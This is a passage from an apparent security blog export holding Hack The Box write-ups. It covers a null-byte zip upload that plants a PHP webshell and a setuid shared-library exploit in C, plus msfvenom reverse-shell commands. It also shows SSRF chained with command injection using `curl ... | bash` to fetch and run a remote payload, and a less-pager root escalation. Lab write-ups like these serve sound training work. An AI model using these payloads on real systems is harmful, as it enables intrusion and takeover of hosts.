echo \u0026#34;\u0026lt;p\u0026gt;The unzipped file must have a .pdf extension.\u0026lt;/p\u0026gt;\u0026#34;; } } } else { echo \u0026#34;Error uploading file.\u0026#34;; } } } ?\u0026gt; The code checks if the archive contains a PDF file using the pathinfo() function which can be bypassed using a null byte (\\x00).\nphp \u0026gt; echo pathinfo(\u0026#34;shell.php%00.pdf\u0026#34;, PATHINFO_EXTENSION); PHP Parse error: syntax error, unexpected token \u0026#34;echo\u0026#34;, expecting \u0026#34;,\u0026#34; or \u0026#34;;\u0026#34; in php shell code on line 2 php \u0026gt; echo pathinfo(\u0026#34;shell.php\\x00.pdf\u0026#34;, PATHINFO_EXTENSION); pdf To add in a null byte, I used the char # as a place holder and then replaced it using iamhex.\n\u0026gt; zip rce.zip webshell.php\\#.pdf \u0026gt; strings rce.zip webshell.php#.pdfUT ...snip... webshell.php#.pdfUT \u0026gt; imhex rce.zip \u0026amp; Add null bytes using imhex Now when I run strings on the file, the # is replaced\n\u0026gt; strings rce.zip webshell.php .pdfUT ...snip... webshell.php .pdfUT Upon uploading the malicious archive, the application returns a link to view the decompressed file, which, in reality, acts as a webshell payload.\nUpload PHP Webshell navigating to /upload/\u0026lt;md5sum\u0026gt;/webshell.php gives a shell as rektsu.\n\u0026gt; pc -lp 9005 [23:32:21] Welcome to pwncat 🐈! __main__.py:164 [23:48:29] received connection from 10.129.66.225:45182 bind.py:84 [23:48:30] 0.0.0.0:9005: upgrading from /usr/bin/dash to /usr/bin/bash manager.py:957 [23:48:31] 10.129.66.225:45182: registered new host w/ db manager.py:957 (local) pwncat$ (remote) rektsu@zipping:/$ id uid=1001(rektsu) gid=1001(rektsu) groups=1001(rektsu) This vulnerability was patched a few weeks after the box was release\nPrivilege Escalation # The user rektsu has sudo privileges to execute the /usr/bin/stock binary as the root user.\n(remote) rektsu@zipping:/home/rektsu$ sudo -l Matching Defaults entries for rektsu on zipping: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User rektsu may run the following commands on zipping: (ALL) NOPASSWD: /usr/bin/stock Unfortunately, the binary requires a password to proceed.\n(remote) rektsu@zipping:/home/rektsu$ stock Enter the password: 123 Invalid password, please try again. Executing the strings command on the binary reveals two potential passwords and makes reference to a CSV file in the root directory.\n(remote) rektsu@zipping:/home/rektsu$ strings /usr/bin/stock Hakaize St0ckM4nager /root/.stock.csv Enter the password: Invalid password, please try again. ================== Menu ================== 1) See the stock 2) Edit the stock 3) Exit the program Select an option: You do not have permissions to read the file File could not be opened. ================== Stock Actual ================== Colour Black Gold Silver Amount %-7d %-7d %-7d Quality Excelent Average Poor Amount %-9d %-7d %-4d Exclusive Yes No Amount %-4d %-4d Warranty Yes No ================== Edit Stock ================== Enter the information of the watch you wish to update: Colour (0: black, 1: gold, 2: silver): Quality (0: excelent, 1: average, 2: poor): Exclusivity (0: yes, 1: no): Warranty (0: yes, 1: no): Amount: Error: The information entered is incorrect %d,%d,%d,%d,%d,%d,%d,%d,%d,%d The stock has been updated correctly. Investigating binary #To further analyze the binary, I downloaded it locally as the box lacked the ltrace tool. It\u0026rsquo;s evident that the entered password is compared to the string St0ckM4nager.\n\u0026gt; ltrace ./stock printf(\u0026#34;Enter the password: \u0026#34;) = 20 fgets(Enter the password: 123 \u0026#34;123\\n\u0026#34;, 30, 0x7f1f74709aa0) = 0x7ffd232c0f00 strchr(\u0026#34;123\\n\u0026#34;, \u0026#39;\\n\u0026#39;) = \u0026#34;\\n\u0026#34; strcmp(\u0026#34;123\u0026#34;, \u0026#34;St0ckM4nager\u0026#34;) = -34 puts(\u0026#34;Invalid password, please try aga\u0026#34;...Invalid password, please try again. ) = 36 +++ exited (status 1) +++ After rerunning ltrace with the correct password, I noticed that a shared library gets loaded. What caught my attention is that this library is stored at /home/rektsu/.config/libcounter.so, a location accessible to me as the user rektsu.\n\u0026gt; ltrace -s 50 ./stock printf(\u0026#34;Enter the password: \u0026#34;) = 20 fgets(Enter the password: St0ckM4nager \u0026#34;St0ckM4nager\\n\u0026#34;, 30, 0x7f713dc51aa0) = 0x7ffdd7b61f90 strchr(\u0026#34;St0ckM4nager\\n\u0026#34;, \u0026#39;\\n\u0026#39;) = \u0026#34;\\n\u0026#34; strcmp(\u0026#34;St0ckM4nager\u0026#34;, \u0026#34;St0ckM4nager\u0026#34;) = 0 dlopen(\u0026#34;/home/rektsu/.config/libcounter.so\u0026#34;, 1) = 0 puts(\u0026#34;\\n================== Menu ==================\\n\u0026#34; ...snip... Unfortunately, strace doesn\u0026rsquo;t give any new information.\nwrite(1, \u0026#34;Enter the password: \u0026#34;, 20Enter the password: ) = 20 read(0, St0ckM4nager \u0026#34;St0ckM4nager\\n\u0026#34;, 1024) = 13 openat(AT_FDCWD, \u0026#34;/home/rektsu/.config/libcounter.so\u0026#34;, O_RDONLY|O_CLOEXEC) = -1 ENOENT (No such file or directory) Disassembly with gdb (Alternative) #I can also use gdb to disassemble the binary and inbvstigate it.\n❯ gdb ./stock GNU gdb (Debian 13.2-1) 13.2 Reading symbols from ./stock... (No debugging symbols found in ./stock) (gdb) disassemble main Dump of assembler code for function main: 0x00000000000012ba \u0026lt;+0\u0026gt;: push %rbp 0x00000000000012bb \u0026lt;+1\u0026gt;: mov %rsp,%rbp 0x00000000000012be \u0026lt;+4\u0026gt;: sub $0x100,%rsp \u0026lt;---snip---\u0026gt; 0x00000000000013db \u0026lt;+289\u0026gt;: mov %rax,%rdi 0x00000000000013de \u0026lt;+292\u0026gt;: call 0x10b0 \u0026lt;dlopen@plt\u0026gt; 0x00000000000013e3 \u0026lt;+297\u0026gt;: mov %rax,-0x20(%rbp) \u0026lt;---snip---\u0026gt; The dltopen() call was interesting, it is supposed to load a library dynamically and store the return value. Ideally, rax is supposed to store the return value and rdi is typically the first argument passed to a function call. This means rdi would contain the first argument for the dynamic linking i.e. the library.\nTo investigate this, I set a breakpoint at the dltopen() call, and run the binary again. b *main +292 sets a breakpoint on main at an offset of 292.\n(gdb) b *main +292 Breakpoint 2 at 0x5555555553de (gdb) info b Num Type Disp Enb Address What 2 breakpoint keep y 0x00005555555553de \u0026lt;main+292\u0026gt; (gdb) r The program being debugged has been started already. Start it from the beginning? (y or n) y Starting program: /home/kali/HTB/Zipping/loot/stock [Thread debugging using libthread_db enabled] Using host libthread_db library \u0026#34;/lib/x86_64-linux-gnu/libthread_db.so.1\u0026#34;. Enter the password: St0ckM4nager Breakpoint 2, 0x00005555555553de in main () (gdb) info registers rax 0x7fffffffd400 140737488344064 rbx 0x7fffffffd5f8 140737488344568 rcx 0x7a 122 rdx 0x6f 111 rsi 0x1 1 rdi 0x7fffffffd400 140737488344064 \u0026lt;---snip---\u0026gt; Now, when I step into the dltopen() function, I can see the arguments to it. Alternatively, I can also use the examine/string or x/s gdb command to dump the contents of the rdi register.\n(gdb) step Single stepping until exit from function main, which has no line number information. ___dlopen (file=0x7fffffffd400 \u0026#34;/home/rektsu/.config/libcounter.so\u0026#34;, mode=1) at ./dlfcn/dlopen.c:77 77 ./dlfcn/dlopen.c: No such file or directory. (gdb) x/s $rdi 0x7fffffffd400: \u0026#34;/home/rektsu/.config/libcounter.so\u0026#34; (gdb) c Continuing. ================== Menu ================== 1) See the stock 2) Edit the stock 3) Exit the program Select an option: This means the /home/rektsu/.config/libcounter.so library is dynamically linked password after entering the password.\nShared library object exploit #I found a blog post that explained how to exploit shared library injection.\nexploit.c\n#include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; static void exploit() __attribute__((constructor)); void exploit() { setuid(0); system(\u0026#34;/bin/bash -p\u0026#34;); } The __attribute__((constructor)) attribute ensures that the exploit() function will be automatically called when the shared library is loaded, before the main() of stock is executed.\nCompiling the exploit as a shared library\n-shared tells the gcc compiler to create a shared library -fPIC generates Position Independent Code . This is required because the shared object should be able to be loaded and executed at any memory address \u0026gt; gcc -shared -o libcounter.so -fPIC exploit.c \u0026gt; l Permissions Size User Date Modified Name .rw-r--r-- 130 kali 2 Sep 01:12 exploit.c .rwxr-xr-x 15k kali 2 Sep 01:12 libcounter.so Uploaded the shared library to the required location on the box and made it executable.\n(remote) rektsu@zipping:/home/rektsu$ (local) pwncat$ upload ../exploit/root/libcounter.so .config/libcounter.so .config/libcounter.so ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100.0% • 15.4/15.4 KB • ? • 0:00:00 [01:32:39] uploaded 15.43KiB in 0.94 seconds upload.py:76 (local) pwncat$ (remote) rektsu@zipping:/home/rektsu$ chmod +x .config/libcounter.so Now, by executing the binary as root and supplying the valid password, it triggers the bash -p from the exploit code, granting a shell with root privileges.\n(remote) rektsu@zipping:/home/rektsu$ sudo /usr/bin/stock Enter the password: St0ckM4nager root@zipping:/home/rektsu# id uid=0(root) gid=0(root) groups=0(root) root@zipping:/home/rektsu# cd root@zipping:~# ls -l root.txt -rw-r----- 1 root root 33 Sep 1 11:10 root.txt Another option is to use msfvenom to build the malicious shared object.\nmsfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.10.14.42 LPORT=4444 -f elf-so -o libcounter.so msfvenom -p linux/x64/shell/reverse_tcp LHOST=10.10.14.42 LPORT=4444 -f elf-so -o libcounter.so Pwned\nRelated Links # File Upload - HackTricks Arbitrary local file read via file upload - Vulnerabilities - Acunetix PHP Tricks - HackTricks php - PDO support for multiple queries (PDO_MYSQL, PDO_MYSQLND) - Stack Overflow PDO_MYSQLND: Mighty multiple-queries and PDOStatement - Ulf Wendel SELECT INTO OUTFILE - MariaDB Knowledge Base Abusing missing libraries for Privilege Escalation | by Nishant Sharma | Pentester Academy Blog Exploiting Shared Library Misconfigurations ","date":"14 January 2024","permalink":"/blog/htb-zipping/","section":"Blog Posts","summary":"Zipping is a medium-difficulty Linux box hosting a PHP web application with a vulnerable file upload function. This function is susceptible to a file read exploit involving zip archives. By exploiting this flaw, I was able to obtain the application\u0026rsquo;s source code, revealing a SQL injection vulnerability. I leveraged this vulnerability to write a webshell on the system. Additionally, I discovered that the user \u003ccode\u003erektsu\u003c/code\u003e has sudo privileges over a binary, and misconfigurations in shared library objects can be exploited to gain root privileges.","title":"HTB Zipping"},{"content":"","date":null,"permalink":"/tags/htb-medium/","section":"Tags","summary":"","title":"Htb-Medium"},{"content":"","date":null,"permalink":"/tags/lfi/","section":"Tags","summary":"","title":"Lfi"},{"content":"","date":null,"permalink":"/categories/linux/","section":"Categories","summary":"","title":"Linux"},{"content":"","date":null,"permalink":"/tags/ltrace/","section":"Tags","summary":"","title":"Ltrace"},{"content":"","date":null,"permalink":"/tags/msfvenom/","section":"Tags","summary":"","title":"Msfvenom"},{"content":"","date":null,"permalink":"/tags/null-byte/","section":"Tags","summary":"","title":"Null-Byte"},{"content":"","date":null,"permalink":"/tags/pdo-prepare/","section":"Tags","summary":"","title":"Pdo-Prepare"},{"content":"","date":null,"permalink":"/tags/php/","section":"Tags","summary":"","title":"Php"},{"content":"","date":null,"permalink":"/tags/php-regex/","section":"Tags","summary":"","title":"Php-Regex"},{"content":"","date":null,"permalink":"/tags/preg_match/","section":"Tags","summary":"","title":"Preg_match"},{"content":"","date":null,"permalink":"/tags/shared-object/","section":"Tags","summary":"","title":"Shared-Object"},{"content":"","date":null,"permalink":"/tags/sql-injection/","section":"Tags","summary":"","title":"Sql-Injection"},{"content":"","date":null,"permalink":"/tags/sqli-file-write/","section":"Tags","summary":"","title":"Sqli-File-Write"},{"content":"","date":null,"permalink":"/tags/strings/","section":"Tags","summary":"","title":"Strings"},{"content":"","date":null,"permalink":"/tags/zip/","section":"Tags","summary":"","title":"Zip"},{"content":"","date":null,"permalink":"/tags/zip-symlink/","section":"Tags","summary":"","title":"Zip-Symlink"},{"content":"","date":null,"permalink":"/tags/command-injection/","section":"Tags","summary":"","title":"Command-Injection"},{"content":"Overview # Sau is an easy linux box that hosts an website on a non standard port. Exploiting an SSRF vulnerability on the site allowed for the exploitation of a command injection flaw within an internal Mailtrail application, leading to a shell as the user puma. Next, user puma has sudo privileges for systemctl, and the less pager is exploited to escalate privileges.\nEnumeration # Open Ports #Found two open and two filtered ports using nmap\nPort 22 is running OpenSSH. Port 55555 seems to be HTTP as it responds to a GET request. \u0026gt; nmap -p- -Pn -T4 --min-rate 1000 --max-retries 5 -oA 10.129.14.169/10.129.14.169_fullScan 10.129.14.169 Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-11 13:29 EDT Nmap scan report for 10.129.14.169 Host is up (0.17s latency). Not shown: 65531 closed tcp ports (conn-refused) PORT STATE SERVICE 22/tcp open ssh 80/tcp filtered http 8338/tcp filtered unknown 55555/tcp open unknown \u0026gt; nmap -p22,80,8338,55555 -sV -sC -T4 -Pn -oA 10.129.14.169/10.129.14.169 10.129.14.169 Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-11 13:35 EDT Nmap scan report for 10.129.14.169 Host is up (0.17s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 aa8867d7133d083a8ace9dc4ddf3e1ed (RSA) | 256 ec2eb105872a0c7db149876495dc8a21 (ECDSA) |_ 256 b30c47fba2f212ccce0b58820e504336 (ED25519) 80/tcp filtered http 8338/tcp filtered unknown 55555/tcp open unknown | fingerprint-strings: | FourOhFourRequest: | HTTP/1.0 400 Bad Request | Content-Type: text/plain; charset=utf-8 | X-Content-Type-Options: nosniff | Date: Tue, 11 Jul 2023 17:36:09 GMT | Content-Length: 75 | invalid basket name; the name does not match pattern: ^[wd-_\\.]{1,250}$ | GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: | HTTP/1.1 400 Bad Request | Content-Type: text/plain; charset=utf-8 | Connection: close | Request | GetRequest: | HTTP/1.0 302 Found | Content-Type: text/html; charset=utf-8 | Location: /web | Date: Tue, 11 Jul 2023 17:35:40 GMT | Content-Length: 27 | href=\u0026#34;/web\u0026#34;\u0026gt;Found\u0026lt;/a\u0026gt;. | HTTPOptions: | HTTP/1.0 200 OK | Allow: GET, OPTIONS | Date: Tue, 11 Jul 2023 17:35:41 GMT |_ Content-Length: 0 port 55555 - HTTP #A GET request to the website on port 55555 redirects to the /web directory. The response headers didn\u0026rsquo;t reveal anything else of interest.\n\u0026gt; http -ph 10.129.14.169:55555 HTTP/1.1 302 Found Content-Length: 27 Content-Type: text/html; charset=utf-8 Date: Tue, 11 Jul 2023 17:35:57 GMT Location: /web The /web page offers the capability to create something called request basket using the request-basket web service. Additionally, the page indicates that the version in use is 1.2.1.\nUpon creating a basket, I found that I could send requests to it, and the service effectively echoes back the User-Agent header I used. However, I wasn\u0026rsquo;t able to find any vulnerabilities to exploit.\nNew basket Initial Foothold # Exploiting SSRF in requests-basket #Looking for vulnerabilities in requests-baskets v1.2.1, I discovered GitHub Advisory for CVE-2023-27163. According to this advisory, the /api/baskets/{basket_name} endpoint is susceptible to Server Side Request Forgery (SSRF) because of two parameters, namely forward_url and proxy_response.\nproxy_response: If set to true this basket behaves as a full proxy: responses from underlying service configured in forward_url are passed back to clients of original requests. The configuration of basket responses is ignored in this case.\nWith proxy_response is turned on, the website will actually forward a request to whatever address is listed in forward_url. This means I could try to get a peek at internal resources (SSRF). Since, nmap had returned port 80 as a filtered port, used the SSRF vuln to investigate that. I created a basket named ssrf_80 and set the forward_url to http://127.0.0.1:80.\n\u0026gt; http POST 10.129.14.169:55555/api/baskets/ssrf_80 \\ forward_url=\u0026#34;http://127.0.0.1:80\u0026#34; \\ proxy_response:=true \\ insecure_tls:=false \\ expand_path:=true \\ capacity:=250 \\ --follow HTTP/1.1 201 Created Content-Length: 56 Content-Type: application/json; charset=UTF-8 Date: Wed, 12 Jul 2023 09:44:46 GMT { \u0026#34;token\u0026#34;: \u0026#34;BQV43XpBInq-twILBVnzsPkpfxZFGMmybszOw2kN7G0n\u0026#34; } The request to 127.0.0.1:80 can be inspected at http://\u0026lt;IP\u0026gt;:55555/ssrf_80. The page returned a Maltrail page, version 0.53, w/o rendering any JavaScript or CSS. Interestingly, the page also made a reference to a login page.\nMailtrail page via SSRF Curiously, port 8443 also leads to the same Maltrail site.\nCommand Injection in Mailtrail #Looking for vulnerabilities in Mailtrail v0.53, I came across a huntr bounty report indicating a vulnerability to OS Command Injection. The report highlights that the /login endpoint utilizes the subprocess.check_output() function with an unsanitized username parameter. This vulnerability allows for command injection using a semicolon ;.\nFirst, I create a basket to proxy Mailtrail\u0026rsquo;s /login endpoint.\n\u0026gt; http POST 10.129.14.169:55555/api/baskets/ssrf_80_login \\ forward_url=\u0026#34;http://127.0.0.1:80/login\u0026#34; \\ proxy_response:=true \\ insecure_tls:=false \\ expand_path:=true \\ capacity:=250 \\ --follow HTTP/1.1 201 Created Content-Length: 56 Content-Type: application/json; charset=UTF-8 Date: Wed, 12 Jul 2023 09:51:30 GMT { \u0026#34;token\u0026#34;: \u0026#34;qoNJjntQv2qVxraW0ffJ_GWGycCh-YxyGiOE4umMQbiz\u0026#34; } Since this is a blind command injection, I won\u0026rsquo;t get any direct feedback from the server to see if my commands are working. To test it out, I\u0026rsquo;m going to try having the server ping my own computer.\n\u0026gt; http POST 10.129.14.169:55555/ssrf_80_login username=\u0026#39;;`ping -c 3 10.10.14.162`\u0026#39; -f HTTP/1.1 401 Unauthorized Connection: close Content-Encoding: gzip Content-Length: 38 Content-Type: text/plain Date: Wed, 12 Jul 2023 10:19:37 GMT Server: Maltrail/0.53 Login failed And I can see ICMP packets being captured on my attack box using tcpdump\n\u0026gt; _ tcpdump -i tun0 icmp tcpdump: verbose output suppressed, use -v[v]... for full protocol decode listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes 06:19:43.718093 IP 10.129.14.169 \u0026gt; 10.10.14.162: ICMP echo request, id 2, seq 1, length 64 06:19:43.718121 IP 10.10.14.162 \u0026gt; 10.129.14.169: ICMP echo reply, id 2, seq 1, length 64 06:19:44.719166 IP 10.129.14.169 \u0026gt; 10.10.14.162: ICMP echo request, id 2, seq 2, length 64 06:19:44.719186 IP 10.10.14.162 \u0026gt; 10.129.14.169: ICMP echo reply, id 2, seq 2, length 64 06:19:45.722948 IP 10.129.14.169 \u0026gt; 10.10.14.162: ICMP echo request, id 2, seq 3, length 64 06:19:45.722973 IP 10.10.14.162 \u0026gt; 10.129.14.169: ICMP echo reply, id 2, seq 3, length 64 The typical ways of getting a remote shell weren\u0026rsquo;t working for some reason. I\u0026rsquo;m guessing it had to do with how the website was handling the commands I was injecting. To overcome this, I wrote the payload to a file and hosted it from my attack box, and subsequently executed it to get a shell as puma.\n\u0026gt; http POST 10.129.14.169:55555/ssrf_80_login username=\u0026#39;;`curl 10.10.14.162/revshell.sh | bash`\u0026#39; -f \u0026gt; pc -lp 9005 [06:27:46] Welcome to pwncat 🐈! __main__.py:164 [06:30:21] received connection from 10.129.14.169:53468 bind.py:84 [06:30:25] 10.129.14.169:53468: registered new host w/ db manager.py:957 (local) pwncat$ (remote) puma@sau:/opt/maltrail$ id uid=1001(puma) gid=1001(puma) groups=1001(puma) Privilege Escalation # The user puma has sudo privileges to check the status of the mailtrail service using systemctl.\n(remote) puma@sau:/home/puma$ sudo -l Matching Defaults entries for puma on sau: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User puma may run the following commands on sau: (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service Unfortunately, I lack write permission on the service file, nor can I exploit the scripts it\u0026rsquo;s invoking.\n(remote) puma@sau:/home/puma$ ls -la /etc/systemd/system/trail.service -rwxr-xr-x 1 root root 461 Apr 15 09:21 /etc/systemd/system/trail.service (remote) puma@sau:/home/puma$ cat /etc/systemd/system/trail.service [Unit] Description=Maltrail. Server of malicious traffic detection system Documentation=https://github.com/stamparm/maltrail#readme Documentation=https://github.com/stamparm/maltrail/wiki Requires=network.target Before=maltrail-sensor.service After=network-online.target [Service] User=puma Group=puma WorkingDirectory=/opt/maltrail ExecStart=/usr/bin/python3 server.py Restart=on-failure KillMode=mixed [Install] WantedBy=multi-user.target (remote) puma@sau:/home/puma$ ls -al /opt/maltrail/server.py -rwxrwxr-x 1 root root 5101 Jan 31 18:18 /opt/maltrail/server.py Exploiting less pager #Taking advantage of the fact that systemctl uses less as its default pager, I can potentially exploit it based on the LESSSECURE flag. Within the pager, using !\u0026lt;command\u0026gt; allows the execution of commands. As systemctl itself is executed as root, any commands invoked via less will also run with root privileges.\n(remote) puma@sau:/opt/maltrail$ sudo /usr/bin/systemctl status trail.service ● trail.service - Maltrail. Server of malicious traffic detection system Loaded: loaded (/etc/systemd/system/trail.service; enabled; vendor preset: enabled) Active: active (running) since Tue 2023-07-11 16:34:32 UTC; 18h ago Docs: https://github.com/stamparm/maltrail#readme https://github.com/stamparm/maltrail/wiki Main PID: 874 (python3) Tasks: 11 (limit: 4662) Memory: 123.4M CGroup: /system.slice/trail.service ├─ 874 /usr/bin/python3 server.py ├─2642 /bin/sh -c logger -p auth.info -t \u0026#34;maltrail[874]\u0026#34; \u0026#34;Failed password for ;`curl 10.10.14.162/rev\u0026gt; ├─2643 /bin/sh -c logger -p auth.info -t \u0026#34;maltrail[874]\u0026#34; \u0026#34;Failed password for ;`curl 10.10.14.162/rev\u0026gt; !id uid=0(root) gid=0(root) groups=0(root) !done (press RETURN) Similarly, I can get a shell by invoking bash or sh\n!bash root@sau:/opt/maltrail# id uid=0(root) gid=0(root) groups=0(root) root@sau:/opt/maltrail# cd /root root@sau:~# ls -al root.txt -rw-r----- 1 root root 33 Jul 11 16:35 root.txt Pwned\nBeyond root #I was curious how how both port 80 and port 8443 returned the same site via SSRF, so decided to dig into that. Interestingly port 80 isn\u0026rsquo;t open, only port 8443 is. This is strange since my exploits were based off of port 80.\n(remote) root@sau:/opt/maltrail# ss -antlp State Recv-Q Send-Q Local Address:Port Peer Address:Port Process LISTEN 0 5 0.0.0.0:8338 0.0.0.0:* users:((\u0026#34;python3\u0026#34;,pid=874,fd=3)) LISTEN 0 4096 127.0.0.53%lo:53 0.0.0.0:* users:((\u0026#34;systemd-resolve\u0026#34;,pid=833,fd=13)) LISTEN 0 128 0.0.0.0:22 0.0.0.0:* users:((\u0026#34;sshd\u0026#34;,pid=886,fd=3)) LISTEN 0 4096 *:55555 *:* users:((\u0026#34;rbaskets\u0026#34;,pid=3109,fd=3)) LISTEN 0 128 [::]:22 [::]:* users:((\u0026#34;sshd\u0026#34;,pid=886,fd=4)) Examining the iptable rules:\nTraffic to port 80 and 8338 is dropped unless it originates from 127.0.0.1. Additionally, all traffic to port 80 is redirected to port 8338. This explains why the ports were marked filtered by nmap and why I was able to use port 80 in the exploits.\n(remote) root@sau:/opt/maltrail# iptables -S -P INPUT ACCEPT -P FORWARD ACCEPT -P OUTPUT ACCEPT -A INPUT ! -s 127.0.0.1/32 -p tcp -m tcp --dport 80 -j DROP -A INPUT ! -s 127.0.0.1/32 -p tcp -m tcp --dport 8338 -j DROP (remote) root@sau:/opt/maltrail# iptables -L -n Chain INPUT (policy ACCEPT) target prot opt source destination DROP tcp -- !127.0.0.1 0.0.0.0/0 tcp dpt:80 DROP tcp -- !127.0.0.1 0.0.0.0/0 tcp dpt:8338 Chain FORWARD (policy ACCEPT) target prot opt source destination Chain OUTPUT (policy ACCEPT) target prot opt source destination (remote) root@sau:/opt/maltrail# iptables --table nat --list Chain PREROUTING (policy ACCEPT) target prot opt source destination Chain INPUT (policy ACCEPT) target prot opt source destination Chain OUTPUT (policy ACCEPT) target prot opt source destination REDIRECT tcp -- anywhere localhost tcp dpt:http redir ports 8338 Chain POSTROUTING (policy ACCEPT) target prot opt source destination Related Links # request-baskets vulnerable to Server-Side Request Forgery · CVE-2023-27163 · GitHub Advisory Database request-baskets SSRF details - CodiMD Request Baskets API Docs Unauthenticated OS Command Injection in stamparm/maltrail vulnerability found in maltrail systemctl | GTFOBins https://man7.org/linux/man-pages/man1/less.1.html ","date":"10 January 2024","permalink":"/blog/htb-sau/","section":"Blog Posts","summary":"Sau is an easy linux box that hosts an website on a non standard port. Exploiting an SSRF vulnerability on the site allowed for the exploitation of a command injection flaw within an internal Mailtrail application, leading to a shell as the user \u003ccode\u003epuma\u003c/code\u003e. Next, user puma has sudo privileges for \u003ccode\u003esystemctl\u003c/code\u003e, and the \u003ccode\u003eless\u003c/code\u003e pager is exploited to escalate privileges.","title":"HTB Sau"},{"content":"","date":null,"permalink":"/tags/htb-easy/","section":"Tags","summary":"","title":"Htb-Easy"},{"content":"","date":null,"permalink":"/tags/less/","section":"Tags","summary":"","title":"Less"},{"content":"","date":null,"permalink":"/tags/mailtrail/","section":"Tags","summary":"","title":"Mailtrail"},{"content":"","date":null,"permalink":"/tags/pager/","section":"Tags","summary":"","title":"Pager"},{"content":"","date":null,"permalink":"/tags/proxy/","section":"Tags","summary":"","title":"Proxy"},{"content":"","date":null,"permalink":"/tags/request-baskets/","section":"Tags","summary":"","title":"Request-Baskets"},{"content":"","date":null,"permalink":"/tags/ssrf/","section":"Tags","summary":"","title":"SSRF"},{"content":"","date":null,"permalink":"/tags/systemctl/","section":"Tags","summary":"","title":"Systemctl"},{"content":"","date":null,"permalink":"/tags/2fa/","section":"Tags","summary":"","title":"2fa"},{"content":"","date":null,"permalink":"/categories/active-directory/","section":"Categories","summary":"","title":"Active-Directory"},{"content":"","date":null,"permalink":"/tags/adcs/","section":"Tags","summary":"","title":"ADCS"},{"content":"","date":null,"permalink":"/tags/adcstemplate/","section":"Tags","summary":"","title":"ADCSTemplate"},{"content":"","date":null,"permalink":"/tags/av-bypass/","section":"Tags","summary":"","title":"Av-Bypass"},{"content":"","date":null,"permalink":"/tags/c-sharp/","section":"Tags","summary":"","title":"C-Sharp"},{"content":"","date":null,"permalink":"/tags/certipy/","section":"Tags","summary":"","title":"Certipy"},{"content":"","date":null,"permalink":"/tags/ci-cd/","section":"Tags","summary":"","title":"Ci-Cd"},{"content":"","date":null,"permalink":"/tags/esc1/","section":"Tags","summary":"","title":"ESC1"},{"content":"","date":null,"permalink":"/tags/git-patch/","section":"Tags","summary":"","title":"Git-Patch"},{"content":"Overview # Coder is an Insane Windows box. I start by decompiling a C# executable used for encryption. Leveraging a deprecated encryption algorithm, I successfully decrypt an encrypted archive containing a KeePass database and key. With the key, I can access the database, revealing credentials for a TeamCity instance and a 2FA backup code. After brute-forcing the 2FA code, I gain access to TeamCity, allowing me to upload a diff to execute commands in a CI/CD pipeline. Escalating to Super User, I find past builds and uncover two new files. Using command execution from the pipeline, I identify a diff containing encrypted PowerShell credentials. Decrypting these credentials grants access to the account of E.Black, who is part of the PKI Admins group. Utilizing this privilege, I upload a vulnerable template and exploit the ECS1 vulnerability to obtain an Administrator certificate.\nEnumeration # Open Ports #I discovered several open ports during the network scan using Nmap:\nPort 53: DNS Port 80: HTTP Port 88: Kerberos Port 135: RPC Port 445: SMB Port 443: HTTPS Ports 389, 636, 3268, 3269: LDAP over SSL Port 5985: WinRM Port 53/UDP: DNS Port 123/UDP: NTP A script scan of the LDAP ports leaks the domains, coder.htb and dc01.coder.htb.\nnmap -Pn -p\u0026#34;53,80,88,135,139,389,443,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49667,49671,49686,49687,49689,49698,49708,49712\u0026#34; -sV -sC -T4 -oA \u0026#34;nmap/10.129.229.190\u0026#34; \u0026#34;10.129.229.190\u0026#34; Starting Nmap 7.94 ( https://nmap.org ) at 2023-12-13 22:13 IST Nmap scan report for 10.129.229.190 Host is up (0.081s latency). PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft IIS httpd 10.0 |_http-title: IIS Windows Server |_http-server-header: Microsoft-IIS/10.0 | http-methods: |_ Potentially risky methods: TRACE 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2023-12-14 00:42:54Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: coder.htb0., Site: Default-First-Site-Name) |_ssl-date: 2023-12-14T00:43:51+00:00; +7h59m16s from scanner time. | ssl-cert: Subject: | Subject Alternative Name: DNS:dc01.coder.htb, DNS:coder.htb, DNS:CODER | Not valid before: 2023-11-21T23:06:46 |_Not valid after: 2033-11-21T23:16:46 443/tcp open ssl/http Microsoft IIS httpd 10.0 |_http-server-header: Microsoft-IIS/10.0 | tls-alpn: |_ http/1.1 |_http-title: IIS Windows Server |_ssl-date: 2023-12-14T00:43:51+00:00; +7h59m16s from scanner time. | http-methods: |_ Potentially risky methods: TRACE | ssl-cert: Subject: commonName=default-ssl/organizationName=HTB/stateOrProvinceName=CA/countryName=US | Not valid before: 2022-11-04T17:25:43 |_Not valid after: 2032-11-01T17:25:43 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open ssl/ldap | ssl-cert: Subject: | Subject Alternative Name: DNS:dc01.coder.htb, DNS:coder.htb, DNS:CODER | Not valid before: 2023-11-21T23:06:46 |_Not valid after: 2033-11-21T23:16:46 |_ssl-date: 2023-12-14T00:43:51+00:00; +7h59m16s from scanner time. 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: coder.htb0., Site: Default-First-Site-Name) |_ssl-date: 2023-12-14T00:43:51+00:00; +7h59m16s from scanner time. | ssl-cert: Subject: | Subject Alternative Name: DNS:dc01.coder.htb, 